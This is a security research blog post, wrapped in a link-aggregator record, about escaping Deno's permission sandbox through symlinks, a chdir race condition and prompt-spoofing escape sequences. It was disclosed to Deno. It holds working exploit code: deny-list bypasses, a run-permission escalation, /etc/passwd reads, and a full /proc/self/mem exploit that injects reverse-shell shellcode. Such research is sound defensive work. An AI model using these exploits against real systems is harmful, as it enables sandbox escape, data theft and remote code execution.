{"aid": "40168688", "title": "Deno: Digging Tunnels Out of a JavaScript Sandbox", "url": "https://secfault-security.com/blog/deno.html", "domain": "secfault-security.com", "votes": 2, "user": "stuffinmyhand", "posted_at": "2024-04-26 12:38:36", "comments": 0, "source_title": "Secfault Security - Deno: Digging Tunnels out of a JS Sandbox", "source_text": "Secfault Security - Deno: Digging Tunnels out of a JS Sandbox\n\nHome Company Services Trainings Jobs Blog Contact\n\n# Deno: Digging Tunnels out of a JS Sandbox\n\nPosted on April 23, 2024 by finn, lx, olli\n\nBoth Deno and Node.js are runtimes for JavaScript, TypeScript, and WebAssembly\nbased on V8. Ryan Dahl, the founder of Node.js, announced Deno during his talk\nat the JsConf EU 2018 with the title 10 Things I Regret About Node.js. One\nmajor goal of Deno was creating a more secure version of Node.js with a\nsecurity model based on a sandbox that can restrict file system and network\naccesses. Therefore, we focused on analyzing the sandbox in more detail during\nour internal research time at Secfault Security.\n\nThis blog post tells the journey of unearthing a few different vulnerabilities\nin Deno.\n\nPick up your shovels and be ready to get dirty!\n\n## Quick Intro and Overview\n\nDeno is no drop-in replacement for node, it can\u2019t be, considering its goals.\n\nIf your application performs actions that could be dangerous, such as reading\nfiles or executing binaries, you must specify what it may and may not do. In\nthe case of Deno, you can configure a sandbox to define which actions are\nallowed. Now that there is a sandbox mechanism, it is an obvious thing to play\nwith it. But first, let us show you how you can pass arguments to deno to\nconfigure the sandbox for your application:\n\n    \n    \n    # Allow a single file to be read deno run --allow-read=/tmp/foo app.js # Allow reading all files, except one deno run --allow-read --deny-read=/tmp/foo app.js # Allow network access for multiple hosts deno run --allow-net=github.com,deno.land app.js # Allow whoami to be executed deno run --allow-run=whoami app.js\n\nThere are further permissions which can give you access to other resources and\nfunctionality, e.g., --allow-env and --allow-hrtime, but you probably get the\nidea here.\n\nIf you feel you need a more thorough intro, this is a good starting point in\nthe documentation.\n\nInstead of deno run [...] app.js you can also use deno repl [...] to get an\ninteractive shell. Most of the screenshots in this blog post show an\ninteraction with the Deno repl.\n\nAs there are many ways to play around with these permissions, let us provide a\nshort overview of this article:\n\n  * Symlinks and Deno... How Deno handles symlinks and how we discovered the first issue.\n  * Starting To See a Pattern Using symlinks to bypass a read deny list.\n  * How Does the Deno Sandbox Work? Examining the sandbox\u2019s functionality.\n  * Deny Lists Bypassing different deny lists.\n  * Finding the Right Problem for Our Solution Abusing symlinks to gain additional run permissions.\n  * Exploiting a Race Condition To Gain Code Execution Discovering a race condition leading to arbitrary read and write permissions and finally to code execution.\n\nPlease note that the findings described in this post refer to Deno version\n1.39.4. The race condition issue was also present in version 1.42.1, but no\nextensive checks for other versions have been performed.\n\n## Symlinks and Deno...\n\nSymlinks are interesting as they are not easy to handle. We\u2019ve all seen tons\nof bugs involving symlinks in various software. And of course Deno is no\nexception: symlinks have caused trouble in the past, for example there was a\nfile system sandbox escape. We have therefore decided to take a closer look at\nhow Deno handles symlinks.\n\nIt sounds like whereever you have read and/or write permissions, you could\nDeno.symlink(\"/\",\"./foo\") to get access to the full system. It appears that\nthis caused Deno to only allow Deno.symlink() if you have full read and write\npermissions, i.e., --allow-read --allow-write.\n\nKnowing this going into the research, we focused heavily on the file system\nand symlinks in particular.\n\nSoon we discovered the first minor flaw. If you only had read permissions in\nthe current directory, but it contained a symlink to /tmp for example, you\ncould traverse out of that symlink using code like\nDeno.readTextFileSync(\"./link2tmp/../etc/passwd\").\n\nYou can actually take this further and turn any symlink to a directory into a\nfull file system bypass. We won\u2019t spoil exactly how yet, a similar trick will\ncome in handy later!\n\nBut of course, relying on the presence of a symlink to a directory outside of\nthe application is not really a significant attack.\n\n## Starting To See a Pattern\n\nThe initial observations however do beg the question: can we take this any\nfurther? And how exactly does the Deno sandbox work in the first place?\n\nIn a first step, we explored our systems to find interesting symlinks,\nthinking maybe we can do some trickery with those. After some digging\n/proc/self/root/ showed up, which is a symlink to /. We came up with the\nfollowing test setup. Consider an app is running with the following\npermissions:\n\n    \n    \n    deno run --allow-read --deny-read=/etc/passwd app.js\n\nThis means the app can read everything, except for /etc/passwd. Let\u2019s try to\nread it with the symlink in the path.\n\nSo simply by accessing /proc/self/root/etc/passwd we bypassed --deny-read by\nconfusing Deno with existing symlinks!\n\n## How Does the Deno Sandbox Work?\n\nThe above observations of course increased our interest in the inner workings\nof the Deno sandbox. And needless to say, we also tried a lot of things that\nfailed. For instance, /etc/././///passwd does not bypass --deny-\nread=/etc/passwd. Neither does injecting nullbytes, \\r or \\t.\n\nEven without looking into the code you might be able to figure out the root\ncause of this issue already. The file sandbox works by normalizing paths and\nthen comparing them against allow/deny lists. And the issue is that this\nnormalization ignores symlinks! Actually, this appears to be the general\nconcept of the sandbox: Inputs to certain functions are compared against\nallow/deny lists. There is no container or firewall, you\u2019re just limited in\nwhat kind of values you can pass to specific functions.\n\n## Deny Lists\n\nEquipped with this knowledge, let\u2019s quickly go over a few ways to bypass deny\nlists.\n\n  1. \\--allow-write=. --deny-write=./foo/bar We now know this means that you are not allowed to pass a path that normalizes to /path/to/app/foo/bar into the write-style functions. Well, just rename the parent directory foo to something else. Then write to bar. Then rename the parent directory back to foo. Nowhere in this process did you ever touch a file with the path /path/to/app/foo/bar.\n  2. \\--allow-net --deny-net=1.2.3.4 Nope, you can\u2019t use 01.02.03.04, it is normalized again. You can, however, just use a domain that resolves to that IP, like 1.2.3.4.nip.io.\n  3. Missing --allow-env or --deny-env=FOO It\u2019s not the first time that we\u2019ve written a bug report explaining that reading /proc/self/environ can interfere with hidden environment variables. Can you even properly hide environment variables from subprocesses?\n\nCan they even all be called a bug? We think so. As a user, would you expect\nthat you also have to deny write access to the parent directory of a file you\nwant to protect? Or that --allow-read=/ is the same as --allow-read=/ --allow-\nenv?\n\nIs it a bug that --allow-run --deny-run=sudo can be bypassed with\nDeno.run({cmd:[\"sh\", \"-c\", \"sudo\", \"foobar\"}]})? Maybe, but that\u2019s kind of by\ndesign. But, how do you use --deny-run correctly then?\n\nWe would argue that a flag like --deny-env=FOO creates an expectation for a\ndeveloper, that their environment variable FOO is hidden and they build\nsoftware based on this (sometimes) wrong assumption.\n\nA lot of behavior we have seen exists on a slim line between misconfiguration\nand vulnerability. Who is responsible? Deno or the individual devs using it?\nWe often observe such things with permission systems, they are complex.\n\n## Finding the Right Problem for Our Solution\n\nGreat, deny lists can be bypassed. That\u2019s not too unexpected for experienced\nreaders, presumably. Let\u2019s dig deeper.\n\nWe observed that you could traverse out of the allowed directory and back\ninside. For instance, if the current directory is called allowed and ./foo.txt\nis readable, then reading ../allowed/foo.txt is allowed.\n\nWhat happens if we introduce a symlink to the mix? Since we\u2019re at, say,\n/var/web/allowed, let\u2019s imagine there is a symlink to /home/user/.local/bin/\nat /var/web/link. You could now try to access ../link/../allowed/foo. Deno\nwould normalize this to /var/web/allowed/foo, but in reality, it is\n/home/user/.local/allowed/foo.\n\nHowever, this alone is not exploitable for most types of attacks, because\nyou\u2019d have to be very lucky to find:\n\n  * a fitting symlink, that points to\n  * a directory below a directory with the same name as your directory, which in turn\n  * contains a sensitive file.\n\nAfter a while of hanging out in a voice chat with the others to exploit our\n\u201cleftovers\u201d (observations and lame bugs) at the end of our research time, we\nfigured that this behavior can actually be used to escalate --allow-\nrun=something to --allow-run.\n\nConsider an application that is allowed to run whoami, can read all files and\nwrite to the current directory. It may look like this:\n\n    \n    \n    deno run --allow-read --allow-write=. --allow-run=whoami app.js\n\nAnd once again,/proc turns out to be extremely helpful, as it provides a\nsymlink to the current working directory.\n\nNow, to exploit the behavior above, there are 3 steps:\n\n  * Place a binary at ./usr/bin/whoami (i.e., in your writable area)\n  * Create ./a/b/c/ and Deno.chdir into ./a/b/c\n  * Now call: Deno.run({cmd:[\"/proc/self/cwd/../../../usr/bin/whoami\"])\n\n/proc/self/cwd/ is a symlink to the current working directory. We just\nDeno.chdir\u2019d into ./a/b/c/ so that\u2019s where /proc/self/cwd/ points. From there,\n../../../usr/bin/whoami is still inside the app directory, it is the binary we\njust placed there. But since the path normalization ignores symlinks, it\nnormalizes the path into /usr/bin/whoami and thinks that is what we run! Then\nit passes our unnormalized input into whatever function it internally uses to\nrun programs.\n\nBelow you can find an implementation that runs touch /tmp/jrn if whoami is\nallowed to run.\n\n    \n    \n    // Exploit to run any program from --allow-read --allow-write=. --allow-run=whoami Deno.mkdirSync(\"a/b/c/\", {recursive: true}) Deno.mkdirSync(\"usr/bin\", {recursive: true}) Deno.copyFileSync(\"/usr/bin/touch\",\"usr/bin/whoami\") Deno.chdir(\"a/b/c\") Deno.run({cmd:[\"/proc/self/cwd/../../../usr/bin/whoami\", \"/tmp/jrn\"]})\n\nAfter running this code, you\u2019ll find that touch /tmp/jrn has been executed.\n\n/proc for the win, once again!\n\n## Exploiting a Race Condition To Gain Code Execution\n\nOkay, now let\u2019s get to the most severe vulnerability and explain how one can\nobtain arbitrary write permissions and turn these into arbitrary code\nexecution for the following sandbox settings:\n\n    \n    \n    deno run --allow-read=. --allow-write=. app.js\n\n### Discovery of the Race Condition\n\nWhile analyzing the path normalization, we realized that before accessing a\nfile with a relative path, Deno would somehow have to turn this relative path\ninto an absolute one. It is fair to assume that this is done by basically\nprepending the current working directory to the provided relative path. Based\non these thoughts it was quite natural to wonder if that would also work in a\nconcurrent setting. While playing around with this idea, we found that there\nis indeed a race condition between changing directories using Deno.chdir() and\nfile access checks. This is best illustrated by the below example.\n\nLet us start the deno repl as follows:\n\n    \n    \n    mkdir /tmp/inside cd /tmp DENO_NO_PROMPT=1 deno repl --allow-read=.\n\nIt should not be possible to read /etc/passwd as our current working directory\nis /tmp in this setup. For instance, reading from ../etc/passwd should fail -\nbecause ../etc/passwd would resolve to /tmp/../etc/passwd, which would be\nnormalized to /etc/passwd.\n\nIn contrast, if our current working directory is /tmp/inside, then accessing\n../etc/passwd would be permitted - because ../etc/passwd would now resolve to\n/tmp/inside/../etc/passwd, which would be normalized to /tmp/etc/passwd.\n\nHowever, if we rapidly change the current working directory between /tmp and\n/tmp/inside it can happen that our current working directory is /tmp/inside\nduring the permission check, while our current working directory is /tmp when\nwe are reading ../etc/passwd.\n\nLet us really make clear what is going here. The general observation is that\nthe issue is a Time-of-Check/Time-of-Use (ToCToU) problem. As many issues of\nthis class, this one originates from the fact that two consecutive steps are\nexecuted on a resource that might change in between such steps.\n\nIn this case, the race condition is made possible by setting the current\nworking directory twice in a Deno.readTextFile(\"../etc/passwd\") call, once\nbefore the permission check and a second time before the read access, and\nnormalizing the relative path with respect to the current working directory to\nan absolute path each time.\n\nRunning the following code in the repl demonstrates this behavior and leaks\nthe content of /etc/passwd:\n\n    \n    \n    function bar() { for(let i = 0; i < 100; i++) { Deno.chdir(\"/tmp\") Deno.chdir(\"/tmp/inside\") } } async function foo() { try { let x = await Deno.readTextFile(\"../etc/passwd\") console.log(x) } catch {} } setInterval(bar, 0) setInterval(foo, 69)\n\nNow, let us recap what we have gained. We had read permissions for our current\nworking directory /tmp and were able to read the file /etc/passwd which is\noutside of /tmp.\n\nIt is important to think about what preconditions must be met for this attack\nto work. One important prerequisite was a suitable file structure, this was\nthe existence of a subdirectory of our current working directory.\n\nGenerally speaking, the depth of chained subdirectories has to be the same as\nthe number of directories that we want to go upwards with respect to our\ncurrent working directory.\n\nLet us give another example. Let us assume that our current working directory\nis /u1/u2/u3/u4 and that the sandbox is configured as\n\n    \n    \n    deno repl --allow-read=/u1/u2/u3/u4\n\nNow we want to exploit the bug to read /etc/passwd. The relative path\n../../../../etc/passwd is resolved to /u1/u2/u3/u4/../../../../etc/passwd and\nthus normalized to /etc/passwd which is exactly what we want to read but are\nnot allowed to read. Using this relative path means that we have to go four\nlevels upwards before going downwards. Therefore, we need a chain of four\nnested subdirectories with respect to our current working directory\n/u1/u2/u3/u4, for example the file structure could be\n/u1/u2/u3/u4/s1/s2/s3/s4.\n\nIf we change our current working directory to /u1/u2/u3/u4/s1/s2/s3/s4, the\npermission check for ../../../../etc/passwd would succeed as the path is\nnormalized to /u1/u2/u3/u4/etc/passwd which we are allowed to read. To exploit\nthe bug, we call Deno.readTextFile(\"../../../../etc/passwd\") and change our\ncurrent working directory rapidly between /u1/u2/u3/u4 and\n/u1/u2/u3/u4/s1/s2/s3/s4.\n\nHowever, if all chains of nested subdirectories of the current working\ndirectory are shorter than the number of levels we want to go upwards using\n../, then we need to have write permissions in the current working directory\nto create the desired chain of nested subdirectories. Therefore, we are able\nto gain arbitrary read permissions if the sandbox is configured as follows:\n\n    \n    \n    deno repl --allow-read=. --allow-write=.\n\nAs this bug does not only affect Deno.readTextFile(), but also other methods\nlike Deno.open(), we have gained arbitrary read and write permissions!\n\n### Turning Arbitrary Write Permissions into Code Execution\n\nNow, let us think about how we can use arbitrary write permissions to get code\nexecution.\n\nOne way would be overwriting files which are invoked by the OS such as\n.bashrc, .bash-profile or .profile. However, there is a much more direct way\nto get code execution...\n\nWhile reading up about Deno we came across this writeup for the challenge\ndenoblog of the DiceCTF 2022. In this challenge one had arbitrary write but no\nallow-run permissions. The author of the writeup used a well-known technique\nto get code execution where the instructions of the function\nBuiltins_JsonStringify() were overwritten with custom shellcode by writing to\n/proc/self/mem and the shellcode was triggered by calling\nBuiltins_JsonStringify().\n\nBefore we continue we would like to highlight the following question: Why is\nit possible to write to write-protected pages by writing to the file\n/proc/self/mem?\n\nLet us refer to the great article Linux Internals: How /proc/self/mem writes\nto unwritable memory to answer this question. In summary, the kernel can remap\nthe physical frame, which corresponds to the virtual address we want to\naccess, into its own virtual address space with write permissions.\n\nLuckily the same approach works for us, joink. In total, our exploit consists\nof the following steps:\n\n  * Abuse the race condition twice\n\n    * Once to read /proc/self/maps\n    * And a second time get a handle with write access to /proc/self/mem\n  * Patch the Deno process in memory\n\n    * Get the base address of the deno process\u2019 memory by \u201cparsing\u201d /proc/self/maps\n    * Compute the constant offset to the function Builtins_JsonStringify()\n    * Overwrite the instructions of Builtins_JsonStringify() with shellcode that pops a reverse shell\n    * Call Builtins_JsonStringify() to run the shellcode\n\nHere is our full exploit for Deno version 1.42.1 and Linux/AMD64. Please note\nthat the offset 0x128b200 to Builtins_JsonStringify() has to be modified for\nother versions than 1.42.1. Run\n\n    \n    \n    $ deno run --allow-read=. --allow-write=. exploit.ts\n\nwhere exploit.ts contains the following code\n\n    \n    \n    // data for the reverse shell const ip_addr = \"127.0.0.1\" const port = \"4444\" function get_shellcode() { let ip_addr_hex = ip_addr.split('.').map(part => String.fromCharCode(parseInt(part, 10))).join(''); let port_hex = String.fromCharCode((port >> 8) & 0xFF, port & 0xFF); // shellcode for a reverse shell connecting to ip_addr:port let shellcode = \"\\x48\\x31\\xC0\\x48\\x31\\xFF\\x48\\x31\\xF6\\x48\\x31\\xD2\\x4D\\x31\\xC0\\x6A\\x02\\x5F\\x6A\\x01\\x5E\\x6A\\x06\\x5A\\x6A\\x29\\x58\\x0F\\x05\" + \"\\x49\\x89\\xC0\\x48\\x31\\xF6\\x4D\\x31\\xD2\\x41\\x52\\xC6\\x04\\x24\\x02\\x66\\xC7\\x44\\x24\\x02\" + port_hex + \"\\xC7\\x44\\x24\\x04\" + ip_addr_hex + \"\\x48\\x89\\xE6\\x6A\\x10\\x5A\\x41\\x50\\x5F\\x6A\\x2A\\x58\\x0F\\x05\\x48\\x31\\xF6\\x6A\\x03\\x5E\\x48\\xFF\\xCE\\x6A\\x21\\x58\\x0F\\x05\\x75\\xF6\" + \"\\x48\\x31\\xFF\\x57\\x57\\x5E\\x5A\\x48\\xBF\\x2F\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x48\\xC1\\xEF\\x08\\x57\\x54\\x5F\\x6A\\x3B\\x58\\x0F\\x05\"; let shellcode_arr = new Uint8Array(shellcode.length); for (let i = 0; i < shellcode.length; i++) { shellcode_arr[i] = shellcode.charCodeAt(i); } return shellcode_arr; } function wait_for_non_null_value(fn) { let interval_time_ms = 89; return new Promise((resolve) => { const interval_id = setInterval(async () => { const result = await fn(); if (result !== null) { clearInterval(interval_id); resolve(result); } }, interval_time_ms); }); } function change_dirs(old_cwd) { for (let i = 0; i < 100; i++) { Deno.chdir(old_cwd); Deno.chdir(old_cwd + \"/s/e/c/f/a/u/l/t/s/e/c/u/r/i/t/y\"); } } function rapidly_change_dirs(old_cwd) { let interval; return { start: () => { interval = setInterval(change_dirs, 0, old_cwd); }, stop: () => { clearInterval(interval); }, }; } async function get_proc_maps() { let maps = null; try { maps = await Deno.readTextFile(\"../../../../../../../../proc/self/maps\"); } catch {} return maps; } async function get_proc_mem(maps) { let mem_file = null; try { mem_file = await Deno.open(\"../../../../../../../../proc/self/mem\", { write: true }); return mem_file.rid; } catch {} return null; } async function pwn() { console.log(\"[\u03bb] sploit heaping up\"); // get cwd and create a deep directory structure let old_cwd = Deno.cwd(); await Deno.mkdir(\"s/e/c/f/a/u/l/t/s/e/c/u/r/i/t/y\", { recursive: true }); // start changing directories rapidly to confuse deno let start_stop_change_dirs = rapidly_change_dirs(old_cwd); start_stop_change_dirs.start(); (async () => { // get /proc/self/maps console.log(\"[\u03bb] waiting to read /proc/self/maps\"); let maps = await wait_for_non_null_value(get_proc_maps); // get /proc/self/mem console.log(\"[\u03bb] got /proc/self/maps, waiting for fd to /proc/self/mem\"); let mem = await wait_for_non_null_value(get_proc_mem); console.log(\"[\u03bb] got fd for /proc/self/mem:\", mem) // stop changing directories rapidly start_stop_change_dirs.stop(); // extract the base address of deno based on /proc/self/maps let line = maps.split(\"\\n\").find(l => l.includes(\"deno\") && l.includes(\"r-x\")); let base = parseInt(line.split(\" \")[0].split(\"-\")[0], 16); let addr_stringify = base + 0x128b200; // offset for version 1.42.1 console.log(\"[\u03bb] base address deno: 0x\" + (base).toString(16)); console.log(\"[\u03bb] address of Builtins_JsonStringify: 0x\" + (addr_stringify).toString(16)); await Deno.seek(mem, addr_stringify, Deno.SeekMode.Start); // write shellcode let shellcode_arr = get_shellcode(); await Deno.write(mem, shellcode_arr); console.log(\"[\u03bb] placed the shellcode successfully, pwn incoming...\") JSON.stringify(\"JRN\"); })(); } pwn()\n\n## Disclosure and Deno Deploy\n\nWe disclosed all issues described here to Deno. Deno was so kind to let us\ntest these attacks on their cloud environment \u201cDeno Deploy\u201d. This is a\ndifferent runtime based on \u201cdeno_core\u201d, so (most of) our findings did not work\nthere. One important difference is the use of a virtual file system, which\nprevents writing to e.g., /proc/self/mem with the usual file system methods.\n\n## Bonus Bug\n\nWhile writing the blog post we came across CVE-2023-28446.\n\nIt\u2019s an ANSI escape sequence injection attack to spoof prompts. Just for fun,\nwe decided to look at the fix for this issue. TL;DR: Deno now uses a library\nto strip escape sequences. The code actually parses escape sequences and then\nremoves them from the string being displayed.\n\nThis might sound like a sensible idea at first, but there is one significant\nshortcoming: The fix currently strips all escape sequences from the user-\ncontrolled parts of the output, before rendering the authorization prompt.\nHowever, after the user confirmed the prompt, the unstripped version of the\nprovided data is used. By stripping out the escape sequence, Deno therefore\nactually also hides some parts of the file path it is trying to display.\n\nThe following screenshot illustrates the problem.\n\nAnd after accepting this benign request for reading ./foo/bar, the code can\nactually read all files.\n\nThe file name used here is\n./foo/bar\"\\x1b];../../../../../../../../../../../\\x07\\x1b/...\n\nFirst of all, one might notice that there is a double quote character in the\nfile name. The reason for this will become clear in a second.\n\nThe \\x1b];../../../../../../../../../../../\\x07 part in the file name is the\nescape sequence that is used to hide the main part of the file name, namely\nthe ../ sequence. If this sequence was not stripped out of the prompt, the\nuser would likely notice that something shady is going on.\n\nAfter this first escape sequence, the file name contains a second escape\nsequence, namely \\x1b/... This escape sequence is actually not syntactically\ncorrect. It will therefore not be removed from the output, but instead it will\nbe printed to the terminal. However, the terminal will not be able to\ninterpret this escape sequence, so no actual output will be generated;\ninstead, the output will simply be truncated, and no characters following this\nescape sequence will be shown.\n\nThis comes in very handy, because when interpreted as a file name, the escape\nsequence \\x1b];../../../../../../../../../../../\\x07 would refer to a file\nnamed ../../../../../../../../../../\\x07. This is close, but not exactly what\nwe need for a successful attack. The \\x07 at the end somehow has to be\nremoved. And this is precisely where the second (broken) escape sequence comes\ninto play: it adds another ../ to the file name.\n\nAnd this is also the reason for the double quote character in the file name:\nafter the broken escape sequence, no further characters will be shown, not\neven the closing double quote character that Deno appends to the prompt. So in\norder to fix the prompt, we simply add our own closing quote.\n\nAs you can see, when the prompt is closed, the escape sequence is rendered,\nwhich breaks the terminal output around our path. Your terminal might have a\nnew title as well, as this is what the escape sequence was for. But that\ndoesn\u2019t matter, as the user still just accepted a path that normalizes to /.\nThe same works with write access: you\u2019re asked if the app can write to\n./foo/bar and end up allowing it to run code by writing to /proc/self/mem like\nin the race condition exploit.\n\nIt appears that this last issue has been independently identified by RyotaK;\ntwo weeks after reporting the issue to Deno, an advisory describing the\nproblem was published.\n\n\u00a9 2016 - 2024 Secfault Security GmbH | Imprint\n\n", "frontpage": false}
